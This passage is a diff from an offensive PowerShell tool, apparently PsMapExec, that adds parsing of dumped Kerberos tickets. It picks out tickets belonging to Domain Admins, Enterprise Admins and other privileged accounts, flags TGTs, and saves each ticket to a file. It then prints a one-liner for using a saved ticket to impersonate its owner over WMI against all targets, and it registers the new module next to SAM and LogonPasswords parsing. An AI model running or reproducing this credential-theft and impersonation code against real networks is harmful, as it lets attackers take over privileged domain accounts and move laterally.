+                $userNameParts = $data.UserName -split '@'
+                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
+                $DomainUserName = $userNameParts[0]
+
+                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
+                if ($DomainUserName -match '\$$') { Continue }
+
+                # Initialize notes variable
+                $notes = ""
+
+                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
+                $PrivilegedUser = $false  
+
+                if ($DomainUserName -in $DomainAdmins) { 
+                    $notes += "[Domain Admin] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $EnterpriseAdmins) { 
+                    $notes += "[Enterprise Admin] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $ServerOperators) { 
+                    $notes += "[Server Operator] " 
+                    $PrivilegedUser = $true
+                }
+                if ($DomainUserName -in $AccountOperators) { 
+                    $notes += "[Account Operator] " 
+                    $PrivilegedUser = $true
+                }
+
+                # Check AdminCount only if the user is not already identified as $PrivilegedUser
+                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
+                    $notes += "[AdminCount=1] "
+                }
+
+                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
+                if ($data.ServiceName -match "krbtgt/") {
+                    $notes += "[TGT] "
+                }
+
+                # Only present results if the note field has been populated. This means interesting results have been identified.
+                if ($notes -ne "") {
+                    if ($DisplayComputerName) {
+                        Write-Host "`n`n-[$Computer]-`n"
+                        $DisplayComputerName = $false
+                    }
+                    
+                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
+                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
+                    if ($data.ServiceName -match "krbtgt/") {} Else {Write-Host "Server Name   : $($data.ServerName.ToLower())"}
+                    Write-Host "Ticket Expiry : $($data.TicketExp)"
+                    Write-Host -NoNewline "Notes         : "
+                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
+                    Write-Host
+
+                    # Logic to help pull just the ticket string
+                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
+                    $ticketStartPos = $match.Index + $match.Length
+                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
+                    if ($ticketSearchText -match $ticketPattern) {
+                        $ticketString = $Matches[1]
+                        
+                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
+                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
+                        
+                        # Form a path and file name made up of the ticket properties
+                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
+                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
+                        
+                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
+                        if ($notes -match "TGT"){
+                        do {
+                            $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+                        } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)
+
+                        Set-Variable -Name $randomVarName -Value $filePath -Scope Global
+                        
+                        # A neat one-liner instruction for the user
+                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
+                        Write-Host
+                        
+                        } Else {Write-Host}
+                    }
+                }
+            }
+
+             # Move and rename the file after processing
+            $newFileName = ".$Computer.FullDump.txt"
+            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
+        }
+
+    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
+    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
+    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+    Write-Host "Run with -NoParse to prevent parsing results in the future"
+    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
+    Write-Host "Each ticket has been stored in $KerbDump"
 }
 
 
@@ -4435,9 +4464,13 @@ switch ($Method) {
       }
  }
 
+
+
+
 if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
 if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
 if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
+if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}
 
 RestoreTicket
 
